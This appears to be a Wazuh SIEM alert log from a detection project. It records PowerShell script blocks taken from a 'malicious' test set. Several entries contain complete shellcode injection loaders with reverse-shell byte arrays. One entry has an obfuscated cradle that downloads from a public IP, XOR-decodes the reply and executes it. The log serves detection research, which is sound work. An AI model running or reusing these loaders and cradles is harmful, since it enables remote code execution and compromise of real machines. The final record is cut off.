{"timestamp":"2026-07-14T07:53:08.416+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":16,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1784015588.358247","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-14T07:53:38.7806573Z","eventRecordID":"200767","processID":"11536","threadID":"8952","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x86,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x8b,0x4c,0x10,0x78,0xe3,0x4a,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x89,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x69,0x69,0x9c,0xb6,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: e26d2935-4824-4f43-83a0-56a7bf7702ea\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1181.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x86,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x8b,0x4c,0x10,0x78,0xe3,0x4a,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x89,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x69,0x69,0x9c,0xb6,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"e26d2935-4824-4f43-83a0-56a7bf7702ea","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1181.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-14T07:53:12.891+0000","rule":{"level":4,"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","id":"91837","mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]},"firedtimes":1,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1784015592.369137","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-14T07:53:42.4575186Z","eventRecordID":"200779","processID":"11328","threadID":"9608","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n$wC=NeW-OBJEcT SYstem.NEt.WebCLiEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeAdeRS.Add('User-Agent',$u);$wC.PROXY = [SYstEm.NET.WebREQuEST]::DEFaultWEbProxY;$wc.PRoxy.CrEDEnTIaLS = [SySTeM.NeT.CRedENTialCAcHE]::DEfauLtNETWOrKCReDENTials;$K='A}>7L^$89k`WVefHKDOGm4?1p:BX;P0,';$I=0;[cHar[]]$B=([cHaR[]]($wc.DOWNLOAdSTrInG(\"http://41.230.232.65:5552:5552/index.asp\")))|%{$_-BXOr$k[$I++%$k.LEngTH]};IEX ($b-JOiN'')\r\n\r\nScriptBlock ID: 1c648f44-6348-4dbc-8d20-688fcfd87dee\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1208.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$wC=NeW-OBJEcT SYstem.NEt.WebCLiEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeAdeRS.Add('User-Agent',$u);$wC.PROXY = [SYstEm.NET.WebREQuEST]::DEFaultWEbProxY;$wc.PRoxy.CrEDEnTIaLS = [SySTeM.NeT.CRedENTialCAcHE]::DEfauLtNETWOrKCReDENTials;$K='A}&gt;7L^$89k`WVefHKDOGm4?1p:BX;P0,';$I=0;[cHar[]]$B=([cHaR[]]($wc.DOWNLOAdSTrInG(\\\"http://41.230.232.65:5552:5552/index.asp\\\")))|%{$_-BXOr$k[$I++%$k.LEngTH]};IEX ($b-JOiN'')","scriptBlockId":"1c648f44-6348-4dbc-8d20-688fcfd87dee","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1208.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-14T07:53:14.328+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":17,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1784015594.372958","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-14T07:53:44.0861424Z","eventRecordID":"200787","processID":"692","threadID":"10604","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x92,0x68,0x02,0x00,0x01,0xbd,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 93042993-449b-4f83-ad2b-f53cf8d83b44\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1241.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x92,0x68,0x02,0x00,0x01,0xbd,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"93042993-449b-4f83-ad2b-f53cf8d83b44","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1241.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-14T07:53:15.430+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":18,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1784015595.383906","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-14T07:53:45.7695638Z","eventRecordID":"200794","processID":"11924","threadID":"8372","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x64,0x04,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 27fabaf0-38fc-4af7-86c5-692396b07b5b\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1249.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x64,0x04,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"27fabaf0-38fc-4af7-86c5-692396b07b5b","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1249.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-14T07:53:16.880+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":19,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1784015596.394856","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-14T07:53:46.6503073Z","eventRecordID":"200798","processID":"11400","threadID":"9136","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 